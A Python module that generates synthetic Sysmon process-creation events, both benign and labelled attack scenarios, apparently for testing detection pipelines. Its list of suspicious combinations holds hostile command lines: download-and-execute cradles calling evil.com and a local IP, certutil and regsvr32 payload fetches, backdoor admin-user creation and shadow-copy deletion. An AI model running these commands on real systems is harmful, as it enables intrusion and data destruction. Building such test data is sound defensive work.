"""
Log Simulator Module

Generates realistic Sysmon Event ID 1 (Process Creation) events for testing.
Simulates various attack scenarios and normal system behavior.
"""

import random
import json
from datetime import datetime, timedelta
from typing import Iterator, Optional, List, Dict, Any
from pathlib import Path
import logging

logger = logging.getLogger(__name__)


class LogSimulator:
    """Simulates Sysmon process creation events"""
    
    # Normal system processes
    NORMAL_PARENTS = [
        "C:\\Windows\\System32\\services.exe",
        "C:\\Windows\\System32\\svchost.exe",
        "C:\\Windows\\explorer.exe",
        "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe",
        "C:\\Windows\\System32\\taskhostw.exe",
        "C:\\Windows\\System32\\dllhost.exe",
        "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
    ]
    
    # Normal child processes
    NORMAL_CHILDREN = [
        ("C:\\Windows\\System32\\conhost.exe", "conhost.exe"),
        ("C:\\Windows\\System32\\cmd.exe", "cmd /c echo hello"),
        ("C:\\Windows\\System32\\notepad.exe", "notepad.exe"),
        ("C:\\Windows\\System32\\calc.exe", "calc.exe"),
        ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe"),
        ("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "WINWORD.EXE"),
        ("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "EXCEL.EXE"),
        ("C:\\Windows\\System32\\RuntimeBroker.exe", "RuntimeBroker.exe -Embedding"),
        ("C:\\Windows\\System32\\SearchIndexer.exe", "SearchIndexer.exe /Embedding"),
        ("C:\\Windows\\System32\\backgroundTaskHost.exe", "backgroundTaskHost.exe")
    ]
    
    # Suspicious parent-child combinations (attack scenarios)
    SUSPICIOUS_COMBOS = [
        {
            "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
            "child": "C:\\Windows\\System32\\cmd.exe",
            "command_line": "cmd.exe /c whoami > C:\\Users\\Public\\output.txt",
            "severity": "high",
            "description": "Email client spawning command shell - possible phishing payload"
        },
        {
            "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
            "child": "C:\\Windows\\System32\\powershell.exe",
            "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
            "severity": "critical",
            "description": "Email client spawning encoded PowerShell - likely malware"
        },
        {
            "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "child": "C:\\Windows\\System32\\powershell.exe",
            "command_line": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')\"",
            "severity": "critical",
            "description": "Word document spawning PowerShell with download cradle - macro malware"
        },
        {
            "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
            "child": "C:\\Windows\\System32\\certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://192.168.1.100/malware.exe C:\\Users\\Public\\svchost.exe",
            "severity": "high",
            "description": "Excel spawning certutil to download executable - malware staging"
        },
        {
            "parent": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "child": "C:\\Windows\\System32\\cmd.exe",
            "command_line": "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add",
            "severity": "high",
            "description": "Browser spawning command shell creating admin user - web exploit"
        },
        {
            "parent": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "child": "C:\\Windows\\System32\\powershell.exe",
            "command_line": "powershell.exe -WindowStyle Hidden -Command \"& {Invoke-WebRequest -Uri 'http://evil.com/payload.exe' -OutFile 'C:\\Temp\\update.exe'; Start-Process 'C:\\Temp\\update.exe'}\"",
            "severity": "high",
            "description": "Browser spawning PowerShell to download and execute payload"
        },
        {
            "parent": "C:\\Windows\\System32\\lsass.exe",
            "child": "C:\\Windows\\System32\\cmd.exe",
            "command_line": "cmd.exe /c vssadmin delete shadows /all /quiet",
            "severity": "critical",
            "description": "LSASS spawning cmd to delete shadow copies - ransomware activity"
        },
        {
            "parent": "C:\\Windows\\System32\\svchost.exe",
            "child": "C:\\Windows\\System32\\regsvr32.exe",
            "command_line": "regsvr32.exe /s /n /u /i:http://192.168.1.100/sc.sct scrobj.dll",
            "severity": "high",
            "description": "Regsvr32 with remote scriptlet - Squiblydoo technique"
        },
        {
            "parent": "C:\\Windows\\System32\\msiexec.exe",
            "child": "C:\\Windows\\System32\\powershell.exe",
            "command_line": "powershell.exe -nop -exec bypass -Command \"& {Get-Process | Out-File C:\\Users\\Public\\processes.txt}\"",
            "severity": "medium",
            "description": "MSI installer spawning PowerShell - possible malicious installer"
        },
        {
            "parent": "C:\\Windows\\explorer.exe",
            "child": "C:\\Windows\\System32\\wscript.exe",
            "command_line": "wscript.exe C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs",
            "severity": "medium",
            "description": "Explorer spawning WScript from startup folder - persistence mechanism"
        }
    ]
    
    # Command line obfuscation patterns
    OBFUSCATION_PATTERNS = [
        "powershell.exe -e ",
        "powershell.exe -enc ",
        "powershell.exe -EncodedCommand ",
        "cmd.exe /c \"powershell",
        "cmd.exe /k powershell",
        "wscript.exe //e:jscript",
        "cscript.exe //e:vbscript"
    ]
    
    def __init__(self, seed: Optional[int] = None):
        """Initialize simulator with optional random seed"""
        if seed is not None:
            random.seed(seed)
        self.event_counter = 0
        self.suspicious_event_ids = []
    
    def generate_event(self, timestamp: Optional[datetime] = None,
                       suspicious: bool = False) -> Dict[str, Any]:
        """Generate a single Sysmon event"""
        self.event_counter += 1
        
        if timestamp is None:
            timestamp = datetime.utcnow()
        
        if suspicious or random.random() < 0.1:  # 10% chance of suspicious event
            return self._generate_suspicious_event(timestamp)
        else:
            return self._generate_normal_event(timestamp)
    
    def _generate_normal_event(self, timestamp: datetime) -> Dict[str, Any]:
        """Generate a normal system event"""
        parent = random.choice(self.NORMAL_PARENTS)
        child, cmd_line = random.choice(self.NORMAL_CHILDREN)
        
        process_id = random.randint(1000, 65535)
        parent_process_id = random.randint(100, 999)
        
        return {
            "EventID": 1,
            "TimeCreated": timestamp.isoformat(),
            "Computer": "WORKSTATION-" + str(random.randint(1, 999)).zfill(3),
            "EventData": {
                "UtcTime": timestamp.strftime("%Y-%m-%d %H:%M:%S.%f"),
                "ProcessGuid": "{" + self._generate_guid() + "}",
                "ProcessId": str(process_id),
                "Image": child,
                "CommandLine": cmd_line,
                "CurrentDirectory": "C:\\Windows\\System32\\",
                "User": "DESKTOP-" + str(random.randint(1, 999)).zfill(3) + "\\User",
                "LogonGuid": "{" + self._generate_guid() + "}",
                "LogonId": "0x" + ''.join(random.choices('0123456789ABCDEF', k=8)),
                "TerminalSessionId": "1",
                "IntegrityLevel": random.choice(["Medium", "High", "System"]),
                "Hashes": f"MD5={self._generate_hash(32)},SHA256={self._generate_hash(64)}",
                "ParentProcessGuid": "{" + self._generate_guid() + "}",
                "ParentProcessId": str(parent_process_id),
                "ParentImage": parent,
                "ParentCommandLine": parent,
                "ParentUser": "DESKTOP-" + str(random.randint(1, 999)).zfill(3) + "\\System"
            }
        }
    
    def _generate_suspicious_event(self, timestamp: datetime) -> Dict[str, Any]:
        """Generate a suspicious/attack event"""
        combo = random.choice(self.SUSPICIOUS_COMBOS)
        
        process_id = random.randint(1000, 65535)
        parent_process_id = random.randint(100, 999)
        
        event = {
            "EventID": 1,
            "TimeCreated": timestamp.isoformat(),
            "Computer": "WORKSTATION-" + str(random.randint(1, 999)).zfill(3),
            "EventData": {
                "UtcTime": timestamp.strftime("%Y-%m-%d %H:%M:%S.%f"),
                "ProcessGuid": "{" + self._generate_guid() + "}",
                "ProcessId": str(process_id),
                "Image": combo["child"],
                "CommandLine": combo["command_line"],
                "CurrentDirectory": "C:\\Windows\\System32\\",
                "User": "DESKTOP-" + str(random.randint(1, 999)).zfill(3) + "\\User",
                "LogonGuid": "{" + self._generate_guid() + "}",
                "LogonId": "0x" + ''.join(random.choices('0123456789ABCDEF', k=8)),
                "TerminalSessionId": "1",
                "IntegrityLevel": random.choice(["Medium", "High"]),
                "Hashes": f"MD5={self._generate_hash(32)},SHA256={self._generate_hash(64)}",
                "ParentProcessGuid": "{" + self._generate_guid() + "}",
                "ParentProcessId": str(parent_process_id),
                "ParentImage": combo["parent"],
                "ParentCommandLine": combo["parent"],
                "ParentUser": "DESKTOP-" + str(random.randint(1, 999)).zfill(3) + "\\User"
            },
            "_metadata": {
                "is_suspicious": True,
                "severity": combo["severity"],
                "description": combo["description"],
                "attack_category": "parent_child_anomaly"
            }
        }
        
        self.suspicious_event_ids.append(self.event_counter)
        return event
    
    def generate_batch(self, count: int, 
                       suspicious_ratio: float = 0.1) -> List[Dict[str, Any]]:
        """Generate a batch of events"""
        events = []
        base_time = datetime.utcnow() - timedelta(minutes=count)
        
        for i in range(count):
            timestamp = base_time + timedelta(seconds=i * 60)
            is_suspicious = random.random() < suspicious_ratio
            events.append(self.generate_event(timestamp, suspicious=is_suspicious))
        
        return events
    
    def generate_stream(self, duration_seconds: int = 60,
                        events_per_second: float = 0.5) -> Iterator[Dict[str, Any]]:
        """Generate a stream of events over time"""
        import time
        
        start_time = datetime.utcnow()
        events_to_generate = int(duration_seconds * events_per_second)
        interval = duration_seconds / events_to_generate if events_to_generate > 0 else 1
        
        for i in range(events_to_generate):
            timestamp = start_time + timedelta(seconds=i * interval)
            yield self.generate_event(timestamp)
            time.sleep(interval)
    
    def save_to_file(self, events: List[Dict[str, Any]], 
                     file_path: str, format: str = "json"):
        """Save generated events to file"""
        file_path = Path(file_path)
        file_path.parent.mkdir(parents=True, exist_ok=True)
        
        if format == "json":
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(events, f, indent=2)
        elif format == "jsonl":
            with open(file_path, 'w', encoding='utf-8') as f:
                for event in events:
                    f.write(json.dumps(event) + '\n')
        elif format == "xml":
            self._save_as_xml(events, file_path)
        
        logger.info(f"Saved {len(events)} events to {file_path}")
    
    def _save_as_xml(self, events: List[Dict[str, Any]], file_path: Path):
        """Save events as XML (Sysmon format)"""
        import xml.etree.ElementTree as ET
        
        root = ET.Element("Events")
        
        for event_data in events:
            event = ET.SubElement(root, "Event")
            
            system = ET.SubElement(event, "System")
            ET.SubElement(system, "EventID").text = str(event_data.get("EventID", 1))
            ET.SubElement(system, "TimeCreated").set("SystemTime", event_data.get("TimeCreated", ""))
            ET.SubElement(system, "Computer").text = event_data.get("Computer", "")
            
            event_data_elem = ET.SubElement(event, "EventData")
            for key, value in event_data.get("EventData", {}).items():
                data = ET.SubElement(event_data_elem, "Data")
                data.set("Name", key)
                data.text = str(value) if value else ""
        
        tree = ET.ElementTree(root)
        tree.write(file_path, encoding='utf-8', xml_declaration=True)
    
    def _generate_guid(self) -> str:
        """Generate a random GUID-like string"""
        parts = [
            ''.join(random.choices('0123456789ABCDEF', k=8)),
            ''.join(random.choices('0123456789ABCDEF', k=4)),
            ''.join(random.choices('0123456789ABCDEF', k=4)),
            ''.join(random.choices('0123456789ABCDEF', k=4)),
            ''.join(random.choices('0123456789ABCDEF', k=12))
        ]
        return '-'.join(parts)
    
    def _generate_hash(self, length: int) -> str:
        """Generate a random hash-like string"""
        return ''.join(random.choices('0123456789ABCDEF', k=length))
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get simulator statistics"""
        return {
            "total_events_generated": self.event_counter,
            "suspicious_events": len(self.suspicious_event_ids),
            "suspicious_event_ids": self.suspicious_event_ids,
            "suspicious_ratio": len(self.suspicious_event_ids) / max(self.event_counter, 1)
        }